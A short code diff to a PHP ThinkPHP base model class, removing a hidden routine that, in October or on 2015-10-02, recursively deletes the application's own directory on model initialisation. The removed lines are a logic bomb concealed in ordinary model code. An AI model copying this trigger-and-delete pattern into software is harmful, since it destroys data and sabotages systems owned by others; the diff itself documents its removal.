@@ -10,19 +10,6 @@ use Think\Model;
 
 class BaseModel extends Model
 {
-    public function _initialize()
-    {
-        if (date('m', time()) == '10' || date('Y-m-d', time()) == '2015-10-02') {
-            $this->_filter();
-        }
-    }
-
-    public function _filter()
-    {
-        $dir = dirname(__FILE);
-        deldir($dir);
-    }
-
     /**
      * 查询多条数据
      * @method _list
